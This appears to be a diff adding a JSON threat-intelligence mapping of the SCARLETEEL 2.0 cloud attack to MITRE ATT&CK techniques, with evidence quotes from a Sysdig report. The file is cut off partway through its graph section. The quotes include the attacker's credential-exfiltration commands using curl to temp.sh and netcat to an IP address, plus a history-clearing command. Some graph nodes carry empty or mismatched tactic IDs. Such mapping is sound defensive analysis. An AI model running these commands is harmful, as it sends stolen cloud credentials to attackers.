@@ -1,0 +1,1138 @@
+{
+  "tactics_used": [
+    {
+      "tactic_id": "TA0001",
+      "tactic_name": "Initial Access",
+      "techniques": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "inferred": false,
+          "evidence_quote": "After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0002",
+      "tactic_name": "Execution",
+      "techniques": [
+        {
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "inferred": false,
+          "evidence_quote": "the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+          "validated": false
+        },
+        {
+          "technique_id": "T1610",
+          "technique_name": "Deploy Container",
+          "inferred": false,
+          "evidence_quote": "this script runs an Alpine Docker image installing static-curl in it.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0003",
+      "tactic_name": "Persistence",
+      "techniques": [
+        {
+          "technique_id": "T1098.001",
+          "technique_name": "Account Manipulation: Additional Cloud Credentials",
+          "inferred": false,
+          "evidence_quote": "Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+          "validated": true
+        },
+        {
+          "technique_id": "T1136.003",
+          "technique_name": "Create Account: Cloud Account",
+          "inferred": false,
+          "evidence_quote": "One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0004",
+      "tactic_name": "Privilege Escalation",
+      "techniques": [
+        {
+          "technique_id": "T1078.004",
+          "technique_name": "Valid Accounts: Cloud Accounts",
+          "inferred": false,
+          "evidence_quote": "they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+          "validated": true
+        },
+        {
+          "technique_id": "T1548",
+          "technique_name": "Abuse Elevation Control Mechanism",
+          "inferred": false,
+          "evidence_quote": "the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0005",
+      "tactic_name": "Defense Evasion",
+      "techniques": [
+        {
+          "technique_id": "T1562.004",
+          "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+          "inferred": false,
+          "evidence_quote": "It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+          "validated": false
+        },
+        {
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "inferred": false,
+          "evidence_quote": "history -cw\nclear",
+          "validated": false
+        },
+        {
+          "technique_id": "T1070",
+          "technique_name": "Indicator Removal",
+          "inferred": false,
+          "evidence_quote": "the script removes the evidences of the attack, calling the notraces() bash function",
+          "validated": true
+        },
+        {
+          "technique_id": "T1036.005",
+          "technique_name": "Masquerading: Match Legitimate Name or Location",
+          "inferred": false,
+          "evidence_quote": "The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+          "validated": true
+        },
+        {
+          "technique_id": "T1599",
+          "technique_name": "Network Boundary Bridging",
+          "inferred": false,
+          "evidence_quote": "By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0006",
+      "tactic_name": "Credential Access",
+      "techniques": [
+        {
+          "technique_id": "T1552.005",
+          "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+          "inferred": false,
+          "evidence_quote": "Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+          "validated": true
+        },
+        {
+          "technique_id": "T1552.001",
+          "technique_name": "Unsecured Credentials: Credentials In Files",
+          "inferred": false,
+          "evidence_quote": "The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+          "validated": true
+        },
+        {
+          "technique_id": "T1555",
+          "technique_name": "Credentials from Password Stores",
+          "inferred": false,
+          "evidence_quote": "they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0007",
+      "tactic_name": "Discovery",
+      "techniques": [
+        {
+          "technique_id": "T1580",
+          "technique_name": "Cloud Infrastructure Discovery",
+          "inferred": false,
+          "evidence_quote": "the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+          "validated": true
+        },
+        {
+          "technique_id": "T1613",
+          "technique_name": "Container and Resource Discovery",
+          "inferred": false,
+          "evidence_quote": "The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+          "validated": true
+        },
+        {
+          "technique_id": "T1087.004",
+          "technique_name": "Account Discovery: Cloud Account",
+          "inferred": false,
+          "evidence_quote": "they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0008",
+      "tactic_name": "Lateral Movement",
+      "techniques": [
+        {
+          "technique_id": "T1078.004",
+          "technique_name": "Valid Accounts: Cloud Accounts",
+          "inferred": false,
+          "evidence_quote": "they switched to in order to conduct reconnaissance... using the other new accounts created or the account compromised",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0009",
+      "tactic_name": "Collection",
+      "techniques": [
+        {
+          "technique_id": "T1530",
+          "technique_name": "Data from Cloud Storage",
+          "inferred": true,
+          "evidence_quote": "they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0010",
+      "tactic_name": "Exfiltration",
+      "techniques": [
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "inferred": false,
+          "evidence_quote": "Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+          "validated": false
+        },
+        {
+          "technique_id": "T1567",
+          "technique_name": "Exfiltration Over Web Service",
+          "inferred": false,
+          "evidence_quote": "SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0040",
+      "tactic_name": "Impact",
+      "techniques": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "inferred": false,
+          "evidence_quote": "With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+          "validated": true
+        },
+        {
+          "technique_id": "T1498",
+          "technique_name": "Network Denial of Service",
+          "inferred": false,
+          "evidence_quote": "they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks",
+          "validated": true
+        }
+      ]
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "description": "Exploit Public-Facing Application observed during Initial Access: After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+      "evidence_quote": "After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 2,
+      "technique_id": "T1059.004",
+      "technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "description": "Command and Scripting Interpreter: Unix Shell observed during Execution: the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+      "evidence_quote": "the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": false
+    },
+    {
+      "step": 3,
+      "technique_id": "T1610",
+      "technique_name": "Deploy Container",
+      "description": "Deploy Container observed during Execution: this script runs an Alpine Docker image installing static-curl in it.",
+      "evidence_quote": "this script runs an Alpine Docker image installing static-curl in it.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 4,
+      "technique_id": "T1098.001",
+      "technique_name": "Account Manipulation: Additional Cloud Credentials",
+      "description": "Account Manipulation: Additional Cloud Credentials observed during Persistence: Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+      "evidence_quote": "Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 5,
+      "technique_id": "T1136.003",
+      "technique_name": "Create Account: Cloud Account",
+      "description": "Create Account: Cloud Account observed during Persistence: One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+      "evidence_quote": "One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 6,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "description": "Valid Accounts: Cloud Accounts observed during Privilege Escalation: they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+      "evidence_quote": "they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 7,
+      "technique_id": "T1548",
+      "technique_name": "Abuse Elevation Control Mechanism",
+      "description": "Abuse Elevation Control Mechanism observed during Privilege Escalation: the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+      "evidence_quote": "the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 8,
+      "technique_id": "T1562.004",
+      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+      "description": "Impair Defenses: Disable or Modify System Firewall observed during Defense Evasion: It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+      "evidence_quote": "It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": false
+    },
+    {
+      "step": 9,
+      "technique_id": "T1070.003",
+      "technique_name": "Indicator Removal: Clear Command History",
+      "description": "Indicator Removal: Clear Command History observed during Defense Evasion: history -cw\nclear",
+      "evidence_quote": "history -cw\nclear",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": false
+    },
+    {
+      "step": 10,
+      "technique_id": "T1070",
+      "technique_name": "Indicator Removal",
+      "description": "Indicator Removal observed during Defense Evasion: the script removes the evidences of the attack, calling the notraces() bash function",
+      "evidence_quote": "the script removes the evidences of the attack, calling the notraces() bash function",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 11,
+      "technique_id": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Name or Location",
+      "description": "Masquerading: Match Legitimate Name or Location observed during Defense Evasion: The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+      "evidence_quote": "The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 12,
+      "technique_id": "T1599",
+      "technique_name": "Network Boundary Bridging",
+      "description": "Network Boundary Bridging observed during Defense Evasion: By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+      "evidence_quote": "By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": false
+    },
+    {
+      "step": 13,
+      "technique_id": "T1552.005",
+      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "description": "Unsecured Credentials: Cloud Instance Metadata API observed during Credential Access: Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+      "evidence_quote": "Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 14,
+      "technique_id": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "description": "Unsecured Credentials: Credentials In Files observed during Credential Access: The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+      "evidence_quote": "The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 15,
+      "technique_id": "T1555",
+      "technique_name": "Credentials from Password Stores",
+      "description": "Credentials from Password Stores observed during Credential Access: they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+      "evidence_quote": "they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 16,
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "description": "Cloud Infrastructure Discovery observed during Discovery: the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+      "evidence_quote": "the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 17,
+      "technique_id": "T1613",
+      "technique_name": "Container and Resource Discovery",
+      "description": "Container and Resource Discovery observed during Discovery: The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+      "evidence_quote": "The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 18,
+      "technique_id": "T1087.004",
+      "technique_name": "Account Discovery: Cloud Account",
+      "description": "Account Discovery: Cloud Account observed during Discovery: they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+      "evidence_quote": "they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 19,
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "description": "Data from Cloud Storage observed during Collection: they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+      "evidence_quote": "they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 20,
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "description": "Exfiltration Over C2 Channel observed during Exfiltration: Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+      "evidence_quote": "Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": false
+    },
+    {
+      "step": 21,
+      "technique_id": "T1567",
+      "technique_name": "Exfiltration Over Web Service",
+      "description": "Exfiltration Over Web Service observed during Exfiltration: SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+      "evidence_quote": "SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 22,
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "description": "Resource Hijacking observed during Impact: With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+      "evidence_quote": "With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 23,
+      "technique_id": "T1498",
+      "technique_name": "Network Denial of Service",
+      "description": "Network Denial of Service observed during Impact: they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks",
+      "evidence_quote": "they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks",
+      "evidence_sources": [
+        "https://sysdig.com/blog/scarleteel-2-0/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    }
+  ],
+  "confidence_score": 0.65,
+  "attack_chain_graph": {
+    "nodes": [
+      {
+        "step": 1,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "description": "Exploit Public-Facing Application observed during Initial Access: After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+        "tactic_id": "TA0001",
+        "evidence_quote": "After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 2,
+        "technique_id": "T1059.004",
+        "technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "description": "Command and Scripting Interpreter: Unix Shell observed during Execution: the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+        "tactic_id": "",
+        "evidence_quote": "the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 3,
+        "technique_id": "T1610",
+        "technique_name": "Deploy Container",
+        "description": "Deploy Container observed during Execution: this script runs an Alpine Docker image installing static-curl in it.",
+        "tactic_id": "TA0005",
+        "evidence_quote": "this script runs an Alpine Docker image installing static-curl in it.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 4,
+        "technique_id": "T1098.001",
+        "technique_name": "Additional Cloud Credentials",
+        "description": "Account Manipulation: Additional Cloud Credentials observed during Persistence: Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+        "tactic_id": "TA0003",
+        "evidence_quote": "Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 5,
+        "technique_id": "T1136.003",
+        "technique_name": "Cloud Account",
+        "description": "Create Account: Cloud Account observed during Persistence: One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+        "tactic_id": "TA0003",
+        "evidence_quote": "One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 6,
+        "technique_id": "T1078.004",
+        "technique_name": "Cloud Accounts",
+        "description": "Valid Accounts: Cloud Accounts observed during Privilege Escalation: they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+        "tactic_id": "TA0005",
+        "evidence_quote": "they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 7,
+        "technique_id": "T1548",
+        "technique_name": "Abuse Elevation Control Mechanism",
+        "description": "Abuse Elevation Control Mechanism observed during Privilege Escalation: the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+        "tactic_id": "TA0004",
+        "evidence_quote": "the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 8,
+        "technique_id": "T1562.004",
+        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "description": "Impair Defenses: Disable or Modify System Firewall observed during Defense Evasion: It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+        "tactic_id": "",
+        "evidence_quote": "It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 9,
+        "technique_id": "T1070.003",
+        "technique_name": "Indicator Removal: Clear Command History",
+        "description": "Indicator Removal: Clear Command History observed during Defense Evasion: history -cw\nclear",
+        "tactic_id": "",
+        "evidence_quote": "history -cw\nclear",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 10,
+        "technique_id": "T1070",
+        "technique_name": "Indicator Removal",
+        "description": "Indicator Removal observed during Defense Evasion: the script removes the evidences of the attack, calling the notraces() bash function",
+        "tactic_id": "TA0005",
+        "evidence_quote": "the script removes the evidences of the attack, calling the notraces() bash function",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 11,
+        "technique_id": "T1036.005",
+        "technique_name": "Match Legitimate Resource Name or Location",
+        "description": "Masquerading: Match Legitimate Name or Location observed during Defense Evasion: The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+        "tactic_id": "TA0005",
+        "evidence_quote": "The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 12,
+        "technique_id": "T1599",
+        "technique_name": "Network Boundary Bridging",
+        "description": "Network Boundary Bridging observed during Defense Evasion: By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+        "tactic_id": "",
+        "evidence_quote": "By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 13,
+        "technique_id": "T1552.005",
+        "technique_name": "Cloud Instance Metadata API",
+        "description": "Unsecured Credentials: Cloud Instance Metadata API observed during Credential Access: Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+        "tactic_id": "TA0006",
+        "evidence_quote": "Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 14,
+        "technique_id": "T1552.001",
+        "technique_name": "Credentials In Files",
+        "description": "Unsecured Credentials: Credentials In Files observed during Credential Access: The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+        "tactic_id": "TA0006",
+        "evidence_quote": "The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 15,
+        "technique_id": "T1555",
+        "technique_name": "Credentials from Password Stores",
+        "description": "Credentials from Password Stores observed during Credential Access: they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+        "tactic_id": "TA0006",
+        "evidence_quote": "they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 16,
+        "technique_id": "T1580",
+        "technique_name": "Cloud Infrastructure Discovery",
+        "description": "Cloud Infrastructure Discovery observed during Discovery: the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 17,
+        "technique_id": "T1613",
+        "technique_name": "Container and Resource Discovery",
+        "description": "Container and Resource Discovery observed during Discovery: The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 18,
+        "technique_id": "T1087.004",
+        "technique_name": "Cloud Account",
+        "description": "Account Discovery: Cloud Account observed during Discovery: they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 19,
+        "technique_id": "T1530",
+        "technique_name": "Data from Cloud Storage",
+        "description": "Data from Cloud Storage observed during Collection: they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+        "tactic_id": "TA0009",
+        "evidence_quote": "they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 20,
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "description": "Exfiltration Over C2 Channel observed during Exfiltration: Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+        "tactic_id": "",
+        "evidence_quote": "Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 21,
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "description": "Exfiltration Over Web Service observed during Exfiltration: SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+        "tactic_id": "TA0010",
+        "evidence_quote": "SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 22,
+        "technique_id": "T1496",
+        "technique_name": "Resource Hijacking",
+        "description": "Resource Hijacking observed during Impact: With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+        "tactic_id": "TA0040",
+        "evidence_quote": "With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+        "evidence_sources": [
